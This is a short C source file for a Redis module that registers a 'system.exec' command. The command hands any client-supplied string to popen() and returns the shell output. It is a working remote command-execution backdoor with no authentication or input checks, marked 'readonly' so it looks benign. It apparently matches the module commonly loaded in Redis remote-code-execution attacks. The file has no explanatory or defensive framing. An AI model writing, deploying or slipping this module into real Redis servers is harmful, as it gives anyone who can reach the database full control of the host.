#include "RedisModulesSDK/redismodule.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int system_exec(RedisModuleCtx *ctx, RedisModuleString **argv, int argc) {
    if (argc < 2) return RedisModule_WrongArity(ctx);
    size_t cmd_len;
    const char *cmd = RedisModule_StringPtrLen(argv[1], &cmd_len);
    FILE *fp = popen(cmd, "r");
    if (!fp) {
        RedisModule_ReplyWithError(ctx, "popen failed");
        return REDISMODULE_OK;
    }
    char buf[4096];
    size_t n = fread(buf, 1, sizeof(buf) - 1, fp);
    pclose(fp);
    buf[n] = 0;
    RedisModule_ReplyWithStringBuffer(ctx, buf, n);
    return REDISMODULE_OK;
}

int RedisModule_OnLoad(RedisModuleCtx *ctx, RedisModuleString **argv, int argc) {
    if (RedisModule_Init(ctx, "system", 1, REDISMODULE_APIVER_1) == REDISMODULE_ERR)
        return REDISMODULE_ERR;
    if (RedisModule_CreateCommand(ctx, "system.exec", system_exec, "readonly", 1, 1, 1) == REDISMODULE_ERR)
        return REDISMODULE_ERR;
    return REDISMODULE_OK;
}
